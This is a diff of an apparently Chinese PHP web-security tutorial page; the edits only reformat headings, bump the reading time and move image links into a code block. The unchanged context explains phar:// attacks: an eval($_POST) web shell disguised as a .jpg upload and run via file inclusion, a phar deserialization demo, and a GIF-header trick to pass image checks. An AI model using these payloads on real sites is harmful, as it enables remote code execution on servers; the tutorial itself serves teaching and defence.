@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      51
+      52
        分钟
     </span>
   
@@ -475,10 +475,12 @@
 <li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p>
 </li>
 <li><p>运用：</p>
-<h4 id="1、绕过上传限制"><a href="#1、绕过上传限制" class="headerlink" title="1、绕过上传限制"></a>1、绕过上传限制</h4><p>可以利于phar://绕过一些上传限制，多数情况下搭配文件包含使用</p>
+<p><strong>1、绕过上传限制</strong></p>
+<p>可以利于phar://绕过一些上传限制，多数情况下搭配文件包含使用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 构造木马shell.php-&gt;(压缩)xxx.zip-&gt;(修改后缀)xxx.jpg-&gt;上传-&gt;phar://xxx.jpg/shell.php</span><br><span class="hljs-number">1</span>、构造木马 shell.php: <br>	<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-number">2</span>、将shell.php压缩，并修改后缀名为jpg：xxx.jpg(实际是带有文件shell.php但修改了后缀名的压缩包)<br><span class="hljs-number">3</span>、上传xxx.jpg并配合文件包含解析木马（payload：<span class="hljs-string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>）：<br>	<span class="hljs-meta">&lt;?php</span> <br>	<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>);<br>	<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/02/25/xKtb5WPdZQJFaEN.png" srcset="/img/loading.gif"></p>
-<h4 id="2、phar反序列化漏洞"><a href="#2、phar反序列化漏洞" class="headerlink" title="2、phar反序列化漏洞"></a>2、phar反序列化漏洞</h4><ul>
+<p><strong>2、phar反序列化漏洞</strong></p>
+<ul>
 <li><p>（ps : 也是反序列化漏洞，但无需借助unserialize()函数）</p>
 </li>
 <li><p>PHP反序列化漏洞通常是<strong>借助unserialize()函数</strong><br>但<strong>利用phar:// 伪协议</strong>也可以触发PHP反序列化漏洞：<br>1、phar文件以序列化的形式存储用户自定义的meta-data；<br>2、当使用phar://读取phar文件时，就会反序列化meta-data储存的信息</p>
@@ -497,8 +499,7 @@
 </li>
 <li><p>demo:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$string</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Phar create done&quot;</span>;<br>    &#125;<br>&#125;<br><br>@unlink(<span class="hljs-string">&quot;test.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;test.phar&quot;</span>);<span class="hljs-comment">#.phar文件，(后缀名必须为phar)</span><br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php  __HALT_COMPILER(); ?&gt;&quot;</span>);	<span class="hljs-comment">#stub(1)</span><br><span class="hljs-comment">#检测图片头时，可以添加gif头来绕过：GIF89a</span><br><br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$o</span>-&gt;string = <span class="hljs-string">&quot;bphar&quot;</span>;<span class="hljs-comment">#类的属性</span><br><br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>);	<span class="hljs-comment">#将自定义的meta-data存入manifest(2)</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;bphar.txt&quot;</span>,<span class="hljs-string">&quot;bphar&quot;</span>); <span class="hljs-comment">#添加压缩文件(3)</span><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();	<span class="hljs-comment">#签名自动计算(4)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/02/25/QIKqF6MvL9Tif7x.png" srcset="/img/loading.gif" alt="创建成功"><br><img src="https://i.loli.net/2021/02/25/w8cvt7eCQpHMbEj.png" srcset="/img/loading.gif" alt="test.phar文件结构"><br>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br>(也就是phar文件中的反序列化部分)</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>  ![创建成功](https:<span class="hljs-regexp">//i</span>.loli.net<span class="hljs-regexp">/2021/</span><span class="hljs-number">02</span><span class="hljs-regexp">/25/</span>QIKqF6MvL9Tif7x.png)<br>  ![test.phar文件结构](https:<span class="hljs-regexp">//i</span>.loli.net<span class="hljs-regexp">/2021/</span><span class="hljs-number">02</span><span class="hljs-regexp">/25/</span>w8cvt7eCQpHMbEj.png)<br>  在使用Phar:<span class="hljs-regexp">//</span> 协议流解析Phar文件时，Meta-data中的内容都会进行反序列化<br>(也就是phar文件中的反序列化部分)<br></code></pre></td></tr></table></figure>
 </li>
 </ul>
 </li>
